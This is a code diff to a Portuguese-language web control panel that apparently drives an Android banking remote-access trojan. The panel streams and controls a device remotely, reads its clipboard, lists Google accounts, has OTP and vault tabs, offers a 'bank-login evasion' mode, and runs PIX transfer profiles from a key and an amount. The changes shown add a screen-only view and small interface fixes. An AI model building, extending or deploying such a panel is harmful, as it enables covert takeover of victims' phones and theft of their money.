@@ -12,16 +12,16 @@ header{display:flex;gap:6px;align-items:center;padding:6px 10px;background:var(-
 #mais{display:flex;gap:4px;padding:5px 10px;background:#0d1116;border-bottom:1px solid var(--ln);flex-wrap:wrap}
 #mais[hidden]{display:none}
 main{flex:1;display:flex;min-height:0}
-nav{width:78px;background:var(--pn);border-right:1px solid var(--ln);display:flex;flex-direction:column;padding-top:4px;gap:2px;overflow:auto}
+nav{width:78px;background:var(--pn);border-right:1px solid var(--ln);display:flex;flex-direction:column;padding-top:4px;gap:2px;overflow:auto;flex:none}
 nav b{padding:8px 2px;text-align:center;cursor:pointer;color:var(--dim);font-weight:400;font-size:10px;border-left:2px solid transparent}
 nav b.on{color:var(--ac);border-left-color:var(--ac);background:var(--pn2)}
 nav b:hover{color:var(--tx);background:var(--pn2)}
 #wrap{flex:1;min-width:0;min-height:0;position:relative;display:flex;align-items:center;justify-content:center;background:#000;overflow:hidden}
 #wrap.zoom{align-items:flex-start;justify-content:flex-start;overflow:auto}
-#scr{display:block;cursor:crosshair;user-select:none;-webkit-user-drag:none;touch-action:none}
+#scr{display:block;cursor:crosshair;user-select:none;-webkit-user-drag:none;touch-action:none;max-width:none;max-height:none}
 #st{position:absolute;left:0;bottom:0;padding:2px 8px;font:11px monospace;color:var(--warn);pointer-events:none;background:#000000aa}
 #tbar{display:flex;gap:4px;padding:4px 6px;background:var(--pn);border-top:1px solid var(--ln);flex-wrap:wrap}
-aside{width:392px;display:flex;flex-direction:column;background:var(--pn);border-left:1px solid var(--ln);min-width:0}
+aside{width:392px;display:flex;flex-direction:column;background:var(--pn);border-left:1px solid var(--ln);min-width:0;flex:none}
 #hd{display:flex;gap:6px;align-items:center;padding:6px 8px;border-bottom:1px solid var(--ln)}
 #hd h2{font-size:12px;font-weight:600;color:#fff;flex:1}
 #body{flex:1;overflow:auto;padding:7px}
@@ -64,6 +64,8 @@ textarea{width:100%;height:130px;font:11px monospace;background:#05070a;resize:v
 .aj{display:flex;gap:8px;padding:4px 0;border-bottom:1px solid #141a21}
 .aj b{color:#fff;font-weight:600;flex:0 0 130px}
 .aj span{flex:1;color:var(--dim)}
+body.somente header,body.somente nav,body.somente aside,body.somente #tbar{display:none}
+body.somente #wrap{background:#000}
 </style>
 <header>
 <span id=brand>p<i>a</i>inel</span>
@@ -72,6 +74,7 @@ textarea{width:100%;height:130px;font:11px monospace;background:#05070a;resize:v
 <button class=dg title="Para a transmissão, bloqueia a tela e limpa o painel" onclick="c('off')">Desligar</button>
 <button title="Acorda a tela do aparelho" onclick="c('screen',{on:true})">Acordar</button></span>
 <span class=grp><button onclick="zoom(-1)" title="Diminuir zoom">-</button><span id=z class=sm>1x</span><button onclick="zoom(1)" title="Aumentar zoom">+</button></span>
+<button id=so title="Esconde tudo e mostra so a tela (Esc sai)" onclick="soTela()">só tela</button>
 <button id=mg title="Ímã: encaixa o toque no elemento mais próximo" onclick="mag=!mag;this.classList.toggle('on',mag)">ímã</button>
 <button onclick="document.getElementById('mais').hidden=!document.getElementById('mais').hidden">mais opções</button>
 </header>
@@ -86,6 +89,7 @@ textarea{width:100%;height:130px;font:11px monospace;background:#05070a;resize:v
 <button title="Abre a aba de evasão para login bancário" onclick="go('banco')">Modo banco</button>
 <button title="Lê a área de transferência do aparelho" onclick="c('clip')">Área de transferência</button>
 <button title="Reconecta a sessão com o aparelho" onclick="c('recon')">Reconectar</button>
+<button title="Abre a tela de setup no aparelho" onclick="c('setup')">Setup no aparelho</button>
 </div>
 <main>
 <nav>
@@ -106,7 +110,7 @@ textarea{width:100%;height:130px;font:11px monospace;background:#05070a;resize:v
 </div>
 <div id=v-arvore style=display:none>
 <div class="ln"><input id=af placeholder="filtrar por texto"><button onclick="c('tree')">Atualizar</button><label class=sm><input type=checkbox id=ar checked> auto</label></div>
-<div class="ln"><button onclick="c('open')" title="Abre o aplicativo do nó selecionado">Abrir app do nó</button><button onclick="c('back')" title="Voltar">Voltar</button></div>
+<div class="ln"><button onclick="c('open')" title="Abre o aplicativo do nó selecionado">Abrir app do nó</button><button onclick="k(4)" title="Voltar">Voltar</button></div>
 <div class="ln leg">clique no texto = toque no elemento &middot; L = toque longo &middot; T = digitar no campo</div>
 <div id=arv></div>
 </div>
@@ -120,7 +124,7 @@ textarea{width:100%;height:130px;font:11px monospace;background:#05070a;resize:v
 <div class=ln><select id=pfl></select></div>
 <div class=ln><input id=pch placeholder="chave pix"><input id=pvl placeholder="valor" style="flex:0 0 90px"></div>
 <div class=ln><button class=pri onclick="runPix()">Executar perfil</button><button id=wt onclick="wt()">Observar tela</button></div>
-<div class=ln><button onclick="snap()">Capturar elementos</button><button onclick="c('contas')">Contas Google</button><button onclick="c('finger')">Impressão do aparelho</button></div>
+<div class=ln><button onclick="snap()">Capturar elementos</button><button onclick="c('contas')">Contas Google</button><button onclick="recon('finger')">Impressão do aparelho</button></div>
 <div id=snapbox><div class=sm>clique numa linha para virar passo do roteiro</div><pre id=snappre></pre>
 <textarea id=pjson placeholder="[]"></textarea>
 <div class=ln><button onclick="playJ()">Executar JSON</button><button onclick="salvaJ()">Gravar</button><button onclick="carregaJ()">Carregar</button><button onclick="limpaJ()">Limpar</button></div></div>
@@ -163,7 +167,8 @@ textarea{width:100%;height:130px;font:11px monospace;background:#05070a;resize:v
 <div class=aj><b>Ver tela</b><span>liga a transmissão de imagem do aparelho</span></div>
 <div class=aj><b>Desligar</b><span>para a transmissão, bloqueia a tela do aparelho e limpa o painel</span></div>
 <div class=aj><b>Acordar</b><span>acende a tela sem desbloquear</span></div>
-<div class=aj><b>ímã</b><span>puxa o toque para o elemento clicável mais próximo; útil em tela densa, atrapalha em tela de jogo</span></div>
+<div class=aj><b>só tela</b><span>esconde o painel inteiro e deixa apenas a imagem; Esc volta</span></div>
+<div class=aj><b>ímã</b><span>puxa o toque para o elemento clicável mais próximo; útil em tela densa, atrapalha em jogo</span></div>
 <div class=aj><b>Voltar / Home / Recentes</b><span>botões do sistema</span></div>
 <div class=aj><b>Notificações</b><span>abre a gaveta de notificações</span></div>
 <div class=aj><b>Info / Apps</b><span>dados do aparelho e lista de aplicativos instalados</span></div>
@@ -213,7 +218,7 @@ function co(){
     const x=m.d;
     if(x.t==='hello'){log('['+x.id+'] '+x.m+' sdk'+x.sdk+' '+x.w+'x'+x.h+' b'+x.bat+' '+x.ip);
       geo={w:x.w,h:x.h};if(!sel&&x.id){dev.value=x.id;pick()}}
-    else if(x.t==='geo'){geo={w:x.o.w,h:x.o.h}}
+    else if(x.t==='geo'){geo={w:x.o.w,h:x.o.h};ajusta()}
     else if(x.t==='pong'){lat.textContent=(Date.now()-tp)+'ms'}
     else if(x.t==='err'){log('! '+x.o);st.textContent=x.o}
     else if(x.t==='ka'){}
@@ -241,10 +246,10 @@ function frame(d){
   if(recs&&recs.cv)recs.cv.getContext('2d').drawImage(i,0,0,recs.cv.width,recs.cv.height)}
 function ajusta(){
   const nx=i.naturalWidth,ny=i.naturalHeight;if(!nx||!ny)return;
-  const W=wrap.clientWidth,H=wrap.clientHeight;
-  if(!W||!H)return;
+  const W=wrap.clientWidth,H=wrap.clientHeight;if(!W||!H)return;
   const s=Math.min(W/nx,H/ny)*z;
-  i.style.width=Math.max(1,Math.round(nx*s))+'px';i.style.height=Math.max(1,Math.round(ny*s))+'px';
+  i.style.width=Math.max(1,Math.floor(nx*s))+'px';
+  i.style.height=Math.max(1,Math.floor(ny*s))+'px';
   wrap.classList.toggle('zoom',z>1);
 }
 addEventListener('resize',ajusta);
@@ -257,6 +262,8 @@ function pick(){sel=dev.value;lf=0;i.removeAttribute('src');log('[*] '+(sel||'ne
 dev.onchange=pick;
 function c(n,x){if(w&&w.readyState===1&&sel)w.send(JSON.stringify(Object.assign({c:n,id:sel},x||{})))}
 function k(n){c('key',{code:n});push({k:n})}
+function soTela(){document.body.classList.toggle('somente');$('#so').classList.toggle('on',document.body.classList.contains('somente'));setTimeout(ajusta,60)}
+addEventListener('keydown',e=>{if(e.key==='Escape'&&document.body.classList.contains('somente'))soTela()});
 function go(v){vNow=v;
   document.querySelectorAll('nav b').forEach(b=>b.classList.toggle('on',b.dataset.v===v));
   ['live','arvore','cofre','otp','pix','arq','apps','info','tecla','perfil','recon','banco','cfg','ajuda'].forEach(n=>{
